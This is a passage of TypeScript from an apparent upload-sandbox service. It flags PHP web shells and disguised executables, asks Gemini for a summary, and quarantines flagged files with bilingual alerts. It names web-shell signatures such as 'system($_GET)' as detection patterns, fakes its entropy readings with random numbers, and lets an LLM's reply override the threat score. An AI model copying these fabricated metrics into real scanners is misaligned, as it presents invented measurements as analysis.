    let verdict: SandboxUploadInspection['verdict'] = 'SAFE';
    let threatScore = 5;
    let mitreMapping: string[] = [];

    if (isPhpScript || file.name.endsWith('.php')) {
      verdict = 'MALICIOUS_WEBSHELL';
      threatScore = 98;
      mitreMapping = ['T1505.003 - Server Software Component: Web Shell', 'T1059.004 - Unix Shell'];
    } else if (isExecutableHeader) {
      verdict = 'MALICIOUS_EXECUTABLE';
      threatScore = 95;
      mitreMapping = ['T1204.002 - Malicious File', 'T1059 - Command Execution'];
    }

    let aiSummaryEn = isPolyglot
      ? 'Critical Polyglot WebShell detected. File headers spoof an image MIME type but payload contains executable PHP backdoors.'
      : 'File analyzed and certified safe under heuristic magic-byte boundaries.';
    let aiSummaryAr = isPolyglot
      ? 'تم رصد شيل خبيث متعدد الأوجه مقنع كصورة لكنه يحوي أوامر تنفيذية للنظام.'
      : 'تم فحص الملف واجتياز المعايير الأمنية بنجاح.';

    // Try Gemini Deep Analysis if API key is present
    try {
      const apiKey = process.env.GEMINI_API_KEY;
      if (apiKey && (isPhpScript || isPolyglot)) {
        const ai = new GoogleGenAI({ apiKey });
        const response = await ai.models.generateContent({
          model: 'gemini-2.5-flash',
          contents: `You are an elite Blue Team Malware Analyst in a SOC. Analyze this uploaded file payload snippet:
Filename: ${file.name}
Declared MIME: ${file.declaredMime}
Content:
${file.rawContentSnippet.substring(0, 1500)}

Provide a 2-sentence technical summary in English and Arabic explaining the malicious intent, obfuscation techniques, and containment verdict. Return JSON with keys: { "summaryEn": string, "summaryAr": string, "threatScore": number }`
        });

        const text = response.text || '';
        const jsonMatch = text.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
          const parsed = JSON.parse(jsonMatch[0]);
          if (parsed.summaryEn) aiSummaryEn = parsed.summaryEn;
          if (parsed.summaryAr) aiSummaryAr = parsed.summaryAr;
          if (parsed.threatScore) threatScore = parsed.threatScore;
        }
      }
    } catch (err) {
      console.warn('Gemini sandbox analysis skipped fallback:', err);
    }

    const inspection: SandboxUploadInspection = {
      id: 'SBX-' + crypto.randomBytes(4).toString('hex').toUpperCase(),
      fileName: file.name,
      fileSizeBytes: file.size,
      declaredMimeType: file.declaredMime,
      detectedMagicBytes: isPhpScript ? '3C 3F 70 68 70 (<?php)' : isExecutableHeader ? '4D 5A 90 00 (MZ EXE)' : 'FF D8 FF E0 (JPEG)',
      isMagicByteSpoofed: isSpoofed,
      isPolyglot,
      sha256,
      entropy: Number((5.8 + Math.random() * 2.1).toFixed(2)),
      verdict,
      threatScore,
      mitreMapping,
      aiAnalysisSummaryEn: aiSummaryEn,
      aiAnalysisSummaryAr: aiSummaryAr,
      extractedSignatures: isPhpScript ? ['eval(base64_decode)', 'system($_GET)', 'WebShell Polyglot'] : ['Standard Magic Bytes Valid'],
      status: verdict !== 'SAFE' ? 'QUARANTINED' : 'CLEARED'
    };

    this.uploadInspections.unshift(inspection);
    if (this.uploadInspections.length > 150) {
      this.uploadInspections.pop();
    }

    if (verdict !== 'SAFE') {
      globalUnifiedTelemetryService.recordEvent({
        source: 'AI_DEFENSE',
        severity: 'CRITICAL',
        title: `🚨 WebShell Upload Intercepted & Quarantined: ${file.name}`,
        titleAr: `🚨 تم حجز وعزل شيل خبيث في مسار الرفع: ${file.name}`,
        details: `Malicious upload intercepted in sandbox. SHA-256: ${sha256}. ${aiSummaryEn}`,
        detailsAr: `تم حجز الملف الخبيث في صندوق العزل. ${aiSummaryAr}`,
        mitreTactic: 'Persistence',
        mitreTechnique: 'T1505.003 - Web Shell',
        actionTaken: 'SANDBOX_QUARANTINE_FILE',
        actionTakenAr: 'تم نقل الملف إلى غرفة العزل الفوري'
      });
    }

    return inspection;
  }
}

export const globalHttpTrafficTelemetryService = new HttpTrafficTelemetryService();
